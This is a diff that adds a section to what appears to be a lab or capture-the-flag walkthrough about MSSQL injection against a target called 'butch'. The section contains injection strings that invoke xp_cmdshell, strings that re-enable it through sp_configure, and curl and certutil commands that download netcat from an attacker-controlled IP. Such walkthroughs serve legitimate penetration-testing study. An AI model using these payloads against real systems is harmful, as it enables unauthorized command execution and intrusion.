@@ -186,6 +186,72 @@ I then prepare the query:
 
 Unfortunately I get no credentials in responder. I try setting up my own SMB server with Impacket but the connection is not made. It seems I cannot leak an NTLM hash via this method. Worth a try though.
 
+### Checking `xp_cmdshell`
+
+When working with MSSQL one of the first steps should always be checking if [`xp_cmdshell`](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16) can be used. It allows running commands directly on the operating system. The basic structure of the query to use `xp_cmdshell` is:
+
+```sql
+EXEC xp_cmdshell "whoami";
+```
+
+* Can use `'` or `"` around command
+
+In this injection that would look like:
+
+```sql
+'; EXEC xp_cmdshell "whoami"; --
+```
+
+Obviously this is useless because I cannot see the output but it can be used for other things.
+
+#### File Downloads
+
+to download files via `curl` or `certutil` which would look like this in the injection context:
+
+{% code overflow="wrap" %}
+```sql
+'; EXEC xp_cmdshell "curl.exe -k https://192.168.xxx.xxx/netcat.exe -o C:\Windows\Temp\nc.exe"; --
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```sql
+'; EXEC xp_cmdshell "certutil -urlcache -f http://192.168.xxx.xxx/netcat.exe C:/Windows/Temp/nc64.exe"; --
+```
+{% endcode %}
+
+Of course the only way to see if this worked is check the access logs on the web server to see if the machine requested a download. If it did not it means `xp_cmdshell` is disabled (or the machine is behind a firewall not allowing outbound connections at ports 80/443).
+
+#### Enabling `xp_cmdshell`
+
+The user will sometimes have the ability to re-enable `xp_cmdshell`. While this is unlikely it is certainly worth attempting since it is an easy attack vector. The [SQL commands](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver16) to enable `xp_cmdshell` are:
+
+```sql
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+```
+
+```sql
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
+
+In the injection context that looks like:
+
+{% code overflow="wrap" %}
+```sql
+'; EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; --
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```sql
+'; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
+```
+{% endcode %}
+
+Once these commands execute I can retry the [file download commands](butch.md#file-downloads), again monitoring the access logs for the web server. Unfortunately I still see no activity upon running the download commands. This likely means that `xp_cmdshell` is disabled _and_ the user I am able to inject commands as does not have permission to re-enable it. This means I will need to take a less direct approach.&#x20;
+
 ### Time-Based SQLi
 
 I start turning to a blind SQLi approach. To do this I will use the class time-delay methodology. I create SQL statements that pose yes/no questions and then I can determine the answer based on the delay. For example to just test this out I will use the queries:
